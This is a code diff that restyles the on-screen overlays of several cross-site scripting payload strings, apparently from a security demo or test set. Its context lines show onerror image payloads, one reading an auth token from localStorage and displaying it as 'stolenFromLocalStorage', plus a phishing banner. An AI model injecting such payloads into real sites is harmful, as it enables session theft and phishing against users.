@@ -36,7 +36,7 @@ const DOC_01_FETCH = `<img src=x onerror="
     .then(d => {
       document.body.insertAdjacentHTML(
         'beforeend',
-        '<pre style=position:fixed;bottom:16px;right:16px;background:#111;color:#0f0;padding:16px;z-index:9999>'
+        '<pre style=position:fixed;left:max(16px,env(safe-area-inset-left));right:max(16px,env(safe-area-inset-right));bottom:max(16px,env(safe-area-inset-bottom));max-width:min(520px,calc(100vw - 32px));max-height:min(48vh,320px);overflow:auto;background:#111;color:#0f0;padding:16px;z-index:9999;font-size:12px;line-height:1.4>'
         + JSON.stringify(d, null, 2) +
         '</pre>'
       )
@@ -49,13 +49,16 @@ const DOC_02_PHISHING = `<div style="
   top: 0;
   left: 0;
   width: 100%;
-  padding: 16px;
+  padding: max(12px, env(safe-area-inset-top)) max(16px, env(safe-area-inset-right)) max(12px, env(safe-area-inset-bottom)) max(16px, env(safe-area-inset-left));
+  box-sizing: border-box;
   background: #fff3cd;
   color: #664d03;
   border-bottom: 1px solid #ffecb5;
   font-family: Arial, sans-serif;
   z-index: 9999;
   display: flex;
+  flex-wrap: wrap;
+  gap: 12px;
   justify-content: space-between;
   align-items: center;
 ">
@@ -92,7 +95,7 @@ const DOC_03_TOKEN = `<img src="x" onerror="
     var token = localStorage.getItem('auth_token');
     document.body.insertAdjacentHTML(
       'beforeend',
-      '<pre style=position:fixed;bottom:20px;right:20px;background:#222;color:#0f0;padding:16px;z-index:9999;max-width:min(520px,92vw);max-height:48vh;overflow:auto;font-size:12px;line-height:1.4>'
+      '<pre style=position:fixed;left:max(16px,env(safe-area-inset-left));right:max(16px,env(safe-area-inset-right));bottom:max(16px,env(safe-area-inset-bottom));background:#222;color:#0f0;padding:16px;z-index:9999;max-width:min(520px,calc(100vw - 32px));max-height:min(48vh,360px);overflow:auto;font-size:12px;line-height:1.4>'
       + JSON.stringify(
         {
           stolenFromLocalStorage: token,
